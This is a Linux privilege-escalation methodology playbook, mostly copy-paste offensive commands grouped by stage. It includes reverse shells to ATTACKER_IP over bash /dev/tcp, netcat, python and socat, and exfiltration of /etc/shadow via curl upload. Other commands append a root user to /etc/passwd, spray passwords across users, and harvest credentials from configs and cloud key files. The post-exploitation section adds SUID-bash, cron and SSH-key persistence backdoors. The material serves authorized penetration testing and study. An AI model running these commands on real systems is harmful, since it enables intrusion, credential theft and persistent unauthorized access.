# Linux Privilege Escalation Methodology

End-to-end Linux local privilege escalation playbook: situational awareness → automated triage → manual hunting → exploitation → root → post-exploitation. Grounded in current (2025-2026) tradecraft. For deep topic dives see the sibling files in this directory: `suid-sudo-gtfobins.md`, `cron-path-capabilities-nfs.md`, `kernel-and-cve-exploits.md`, `container-and-docker-escape.md`.

> Golden rule of Linux privesc: **the box almost always already contains the vulnerability.** Enumerate exhaustively before reaching for kernel exploits. Kernel exploits are loud, can panic the box, and are the *last* resort on a real engagement.

---

## 0. The Mental Model

Privesc on Linux comes from a small number of root-trust boundaries that are misconfigured:

| Trust boundary | What you abuse | Examples |
|----------------|----------------|----------|
| **Setuid/setgid bit** | A binary runs as its owner (root) | SUID `find`, custom SUID wrappers |
| **sudo policy** | `sudoers` grants you a root command | `NOPASSWD` GTFOBin, `env_keep`, `sudoedit` |
| **Capabilities** | Fine-grained root powers on a file | `cap_setuid`, `cap_dac_read_search` |
| **Scheduled execution** | root runs a file you control | cron, systemd timers, anacron |
| **Writable root-owned path** | root reads/executes attacker-controlled data | `/etc/passwd`, `$PATH` hijack, writable service unit |
| **Shared object loading** | root process loads your `.so` | `LD_PRELOAD`, `RPATH`, wildcard injection |
| **Credentials at rest** | Reusing creds for a higher principal | history, configs, keys, DB creds, `.kdbx` |
| **Kernel / setuid-root daemon CVE** | Memory-safety / logic bug | PwnKit, Dirty Pipe, GameOver(lay), CVE-2024-1086, CVE-2025-6019 |
| **Container boundary** | Escape to host root | privileged container, mounted docker.sock, host PID/mounts |

Every section below maps back to one of these boundaries.

---

## 1. Stabilize Your Shell First

Before enumerating, upgrade from a dumb reverse shell to a real PTY — tab-completion, arrow keys, and `sudo` prompts all break without it.

```bash
# Python PTY (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR if python3 missing:
python -c 'import pty; pty.spawn("/bin/bash")'; script -qc /bin/bash /dev/null

# Then background and fix the terminal:
# Ctrl+Z
stty raw -echo; fg            # run on YOUR box
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 cols 200         # match your terminal (run `stty size` locally)
```

Other PTY spawners when python is absent:

```bash
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
echo 'os.system("/bin/bash")' | python3
expect -c 'spawn /bin/bash; interact'
# socat (full PTY, best experience) — on attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# on target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## 2. Automated Triage

Run an automated scanner first to get fast coverage, then verify findings by hand. Do not blindly trust the output — confirm each "high" before acting.

### LinPEAS (primary)
```bash
# Download on attacker, serve, pull to target (avoid touching disk if possible)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Run directly from memory (no file on disk — good OPSEC):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Full run with color preserved into a log, then read offline:
./linpeas.sh -a 2>&1 | tee /dev/shm/lp.txt

# Targeted/quiet modules (faster, quieter):
./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocws,Net,UsrI,SofI,IntFiles
```
LinPEAS colour legend: **Red/Yellow background = 95%+ a privesc vector**, Red text = of interest. Grep the log for `RED` / `99%`.

### Other scanners
```bash
# linux-smart-enumeration (lse) — tiered verbosity, cleaner output than LinPEAS
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash -s -- -l1

# LinEnum
./LinEnum.sh -t -k password -r report

# Kernel/exploit suggesters
./linux-exploit-suggester.sh                       # mzet, the standard
./linux-exploit-suggester-2.pl
linpeas.sh                                          # also flags kernel CVEs

# pspy — watch cron/root processes WITHOUT root (huge for catching cron + masked creds)
curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /dev/shm/pspy
chmod +x /dev/shm/pspy && /dev/shm/pspy -pf -i 1000
```

> `pspy` is the single highest-value manual tool: it shows full command lines (including passwords passed as args) and short-lived cron jobs that `crontab -l` will never reveal.

---

## 3. Manual Enumeration Checklist

### 3.1 Identity & sudo (always first, by hand)
```bash
id; whoami; groups
sudo -l                         # THE most important command — what can you run as root?
sudo -l -l                      # verbose form (shows env_keep, secure_path)
sudo -V | head -1               # sudo version → check for sudo CVEs (see §7)
cat /etc/sudoers 2>/dev/null; ls -la /etc/sudoers.d/
```
Interesting `id` groups: `sudo`, `wheel`, `admin`, `docker`, `lxd`/`lxc`, `disk`, `adm`, `video`, `shadow`, `kvm`, `libvirt` — several grant trivial root (see §8 and the GTFOBins file).

### 3.2 System & kernel
```bash
uname -a; cat /proc/version; arch
cat /etc/os-release; cat /etc/issue; lsb_release -a 2>/dev/null
hostnamectl
```

### 3.3 Users, processes, and what runs as root
```bash
cat /etc/passwd; grep -vE 'nologin|false' /etc/passwd | cut -d: -f1
ps auxww --sort=-%cpu | head -40
ps auxww | grep -i root
ps -eo user,pid,cmd | grep -iE 'pass|token|key|secret'   # creds in cmdline
watch -n1 'ps -eo user,pid,cmd --sort=start_time | tail'  # poor-man's pspy
```

### 3.4 Network & internal services
```bash
ss -tulpn; netstat -tulpn 2>/dev/null
ss -tnp | grep ESTAB
ip a; ip route
cat /etc/hosts; cat /etc/resolv.conf
# Loopback-only services are gold — pivot/forward them (e.g. mysql, redis, internal admin)
curl -s 127.0.0.1:PORT
```

### 3.5 Filesystem permission sweeps
```bash
# SUID / SGID
find / -perm -4000 -type f 2>/dev/null              # SUID
find / -perm -2000 -type f 2>/dev/null              # SGID
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

# Capabilities (often missed)
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

# World-writable files & dirs (potential hijack of root-run scripts)
find / -writable -type f -not -path "/proc/*" 2>/dev/null
find / -perm -0002 -type f -not -path "/proc/*" 2>/dev/null
find / -writable -type d 2>/dev/null

# Files writable by your groups
find / -group $(id -gn) -writable 2>/dev/null

# Sensitive file perms
ls -la /etc/passwd /etc/shadow /etc/sudoers
find / -name "id_rsa*" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

### 3.6 Scheduled tasks (cron, timers, anacron)
```bash
ls -la /etc/cron* /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab; crontab -l; sudo crontab -l 2>/dev/null
grep -RIn "" /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
systemctl list-timers --all
grep CRON /var/log/syslog /var/log/cron* 2>/dev/null
# Use pspy to catch hidden/short cron jobs!
```

### 3.7 NFS / mounts / fstab
```bash
mount; cat /etc/fstab; cat /proc/mounts
cat /etc/exports 2>/dev/null; showmount -e <host> 2>/dev/null
# no_root_squash export => mount it and drop a SUID root binary (see cron-path-capabilities-nfs.md)
```

---

## 4. Credential Hunting (often the fastest path)

Reusing a found password/key for a higher-privileged account beats any exploit. Hunt relentlessly.

```bash
# Shell / tool histories
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
cat ~/.*_history; cat ~/.zsh_history ~/.mysql_history ~/.psql_history 2>/dev/null

# SSH material (private keys, known_hosts for lateral pivot targets)
find / -name "id_*" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
cat ~/.ssh/* /home/*/.ssh/* 2>/dev/null

# Config files holding secrets (recursive grep is high yield)
grep -RiIn --include=*.{php,py,js,env,ini,conf,cnf,yml,yaml,xml,json,sh} \
  -E 'password|passwd|secret|api[_-]?key|token|aws_|connectionstring' \
  /var/www /opt /home /etc /srv 2>/dev/null | head -80

# Common targets
cat /var/www/html/{config.php,wp-config.php} 2>/dev/null
cat /etc/{mysql/my.cnf,nginx/nginx.conf,apache2/apache2.conf} 2>/dev/null
cat ~/.aws/credentials ~/.config/gcloud/* ~/.docker/config.json 2>/dev/null
cat /etc/fstab | grep -i "password\|credentials"      # CIFS creds files
cat /opt/*/.env /var/www/**/.env 2>/dev/null

# Database creds in memory / on disk
mysql -u root            # try blank/weak
redis-cli                # often unauth on loopback

# Memory scraping for creds (if you can read process memory)
strings /proc/*/environ 2>/dev/null | grep -iE 'pass|key|token'
# Browser/keyring/keepass
find / -name "*.kdbx" -o -name "Login Data" 2>/dev/null
```

After finding any password, **spray it across every local user**:
```bash
for u in $(cut -d: -f1 /etc/passwd); do echo "$PASSWORD" | timeout 2 su - "$u" -c 'id' 2>/dev/null && echo "[+] $u"; done
```

---

## 5. Writable-File Abuse (no exploit needed)

### Writable /etc/passwd (no shadow consultation if a hash is present inline)
```bash
openssl passwd -6 'Passw0rd!'      # or: -1 (md5), -5 (sha256)
# append a UID-0 user with the hash inline:
echo 'r00t:$6$xyz$HASH...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t                            # password: Passw0rd!
# Or blank-password root if you can edit existing root line's 2nd field to ""
```

### Writable /etc/shadow
```bash
mkpasswd -m sha-512 'Passw0rd!'    # generate, paste into root's shadow field
su root
```

### Writable cron script / cron dir
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/root_cron_script.sh
# wait for cron, then:
/tmp/rootbash -p
```

### Writable systemd unit / service binary
```bash
find /etc/systemd/ /lib/systemd/ -writable -type f 2>/dev/null
# Edit ExecStart, then if you can trigger a restart (or wait for reboot):
# [Service]
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
systemctl daemon-reload 2>/dev/null; systemctl restart <svc> 2>/dev/null
```

### $PATH hijack (root script calls a binary by relative/bare name)
```bash
echo $PATH
# If a root cron/SUID program calls e.g. `service` without full path and a writable dir precedes /usr/bin:
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /writable_in_path/service
chmod +x /writable_in_path/service
```

---

## 6. SUID / SGID / Capabilities / sudo (GTFOBins)

These are the bread-and-butter vectors. Full command catalog in **`suid-sudo-gtfobins.md`** and **`cron-path-capabilities-nfs.md`**. Quick triage:

```bash
# Anything non-standard from the SUID list? Cross-reference GTFOBins.
find / -perm -4000 -type f 2>/dev/null
# Capabilities granting root power:
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_read_search|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_chown'
# sudo:
sudo -l
```

Highest-signal sudo/SUID GTFOBins (full set in the dedicated file):
```bash
# SUID
./find . -exec /bin/sh -p \; -quit
./bash -p
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # via cap_setuid binary
# sudo (NOPASSWD examples)
sudo vim -c ':!/bin/sh'
sudo env /bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo less /etc/profile        # then !/bin/sh
sudo install -m =xs $(which bash) .   # copy SUID bash
```

> Always check https://gtfobins.github.io/ for the *exact* binary and the right context (SUID vs sudo vs capability vs limited-shell escape).

---

## 7. Modern Kernel & setuid-root Daemon CVEs (2021-2025)

Use only after enumeration is exhausted. Match kernel/distro precisely; test in a snapshot if possible.

| CVE | Name | Affected | Notes |
|-----|------|----------|-------|
| CVE-2021-4034 | **PwnKit** (polkit `pkexec`) | nearly all distros since 2009 | Reliable, no kernel dep. Check `ls -l $(which pkexec)` is SUID. |
| CVE-2021-3156 | **Baron Samedit** (sudo heap) | sudo < 1.9.5p2 | Check `sudo --version`. |
| CVE-2022-0847 | **Dirty Pipe** | kernel 5.8 – 5.16.11 | Overwrite read-only files (e.g. `/etc/passwd`), hijack SUID. |
| CVE-2021-3493 / CVE-2023-0386 | **OverlayFS** | Ubuntu / kernel ≤ 6.2 | GameOver(lay) widely weaponized on Ubuntu. |
| CVE-2023-4911 | **Looney Tunables** (glibc `GLIBC_TUNABLES`) | glibc 2.34-2.38 (default Fedora/Ubuntu/Debian) | Local root via `ld.so`. |
| CVE-2023-32233 | nf_tables UAF | kernel ≤ 6.3.1 | |
| CVE-2024-1086 | **netfilter nf_tables UAF** | kernel 5.14 – 6.6 | Actively used by ransomware (CISA KEV, Oct 2025). Very reliable. |
| CVE-2025-6018 + CVE-2025-6019 | **PAM + udisks/libblockdev chain** | openSUSE/SLE + Ubuntu/Debian/Fedora | Chains "allow_active" → root via `udisks`. Disclosed Qualys 2025. |

```bash
# Identify precisely before choosing
uname -r; cat /etc/os-release; ldd --version | head -1; dpkg -l | grep -E 'polkit|sudo|glibc' 2>/dev/null
searchsploit "linux kernel $(uname -r | cut -d- -f1)"
# Compile statically when target libs are old:
gcc -static exploit.c -o /dev/shm/x && /dev/shm/x
gcc -m32 exploit.c -o x        # 32-bit if needed
```

Full per-CVE build/run notes live in **`kernel-and-cve-exploits.md`**.

---

## 8. Container & Docker / Group-Based Escapes

If `id` shows `docker`, `lxd`, `lxc`, or `disk`, you likely already have root-equivalent. Full detail in **`container-and-docker-escape.md`**.

```bash
# docker group => instant root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd/lxc group => root via privileged container mounting host
# (build alpine image, init with security.privileged=true, mount /)

# Inside a container? Check for escape primitives:
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
mount | grep -i docker.sock; ls -la /var/run/docker.sock   # mounted socket => host root
capsh --print                                              # CAP_SYS_ADMIN etc.
fdisk -l 2>/dev/null                                       # host disks visible => privileged

# runC / container CVEs (2025): CVE-2025-31133, CVE-2024-21626 (leaky vessels) etc.
```

---

## 9. Reverse Shells & File Transfer (reference)

```bash
# Reverse shells
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Best modern listener on attacker:
rlwrap -cAr nc -lvnp PORT     # readline-capable, then upgrade PTY (see §1)

# File transfer to target
wget http://ATTACKER_IP/x -O /dev/shm/x; curl http://ATTACKER_IP/x -o /dev/shm/x
# server: python3 -m http.server 80   (or `php -S 0.0.0.0:80`)
# encoded inline when no egress:
base64 -w0 file   # on attacker; then `echo BASE64 | base64 -d > file` on target

# Exfil
curl -F "f=@/etc/shadow" http://ATTACKER_IP/up    # with an upload server
```

---

## 10. Post-Exploitation as root

```bash
# Persistence options (engagement-scope permitting)
cp /bin/bash /tmp/.rb; chmod +s /tmp/.rb            # SUID backdoor
echo '* * * * * root cp /bin/bash /tmp/.rb;chmod +s /tmp/.rb' >> /etc/crontab
mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys

# Loot for lateral movement
cat /etc/shadow                                      # crack offline (see 07-password-attacks)
unshadow /etc/passwd /etc/shadow > /dev/shm/un.txt
find / -name "id_rsa" 2>/dev/null                    # pivot keys
cat /root/.bash_history /root/.ssh/known_hosts 2>/dev/null
# Dump creds from running services (mysql, vault, k8s secrets, .kube/config)
```

---

## 11. Cheatsheet (copy-paste)

```bash
# --- ONE-LINER TRIAGE ---
id;sudo -l;uname -a;getcap -r / 2>/dev/null;find / -perm -4000 -type f 2>/dev/null

# --- AUTO ---
curl -L .../linpeas.sh | sh
/dev/shm/pspy64 -pf -i 1000

# --- SUDO/SUID WIN PATTERNS ---
sudo -l                                  # then GTFOBins the allowed binary
find . -exec /bin/sh -p \; -quit         # SUID find
bash -p                                   # SUID bash
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # cap_setuid

# --- WRITABLE PASSWD ---
echo "r00t:$(openssl passwd -6 pwn):0:0::/root:/bin/bash" >> /etc/passwd && su r00t

# --- CONTAINER ---
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# --- KERNEL (last resort) ---
searchsploit linux kernel $(uname -r|cut -d- -f1)
# PwnKit / Dirty Pipe / CVE-2024-1086 / Looney Tunables — match versions first
```

### Decision flow
1. Stabilize PTY → `id` / `sudo -l`.
2. Run LinPEAS + pspy in parallel; hunt credentials by hand.
3. sudo entry? → GTFOBins it. SUID/capability? → GTFOBins it.
4. Writable cron/service/passwd/$PATH? → hijack it.
5. NFS `no_root_squash`? → drop SUID binary.
6. In a privileged/socket-mounted container? → escape to host.
7. Nothing? → match exact kernel/sudo/polkit/glibc version → CVE exploit.

---

## References

- GTFOBins — https://gtfobins.github.io/
- PEASS-ng (LinPEAS) — https://github.com/peass-ng/PEASS-ng
- linux-smart-enumeration — https://github.com/diego-treitos/linux-smart-enumeration
- linux-exploit-suggester — https://github.com/The-Z-Labs/linux-exploit-suggester
- pspy — https://github.com/DominicBreuker/pspy
- HackTricks – Linux Privilege Escalation — https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings – Linux Privilege Escalation — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Qualys – Looney Tunables (CVE-2023-4911) — https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
- Qualys – CVE-2025-6018/6019 LPE chain — https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
- CVE-2024-1086 (netfilter) PoC — https://github.com/Notselwyn/CVE-2024-1086
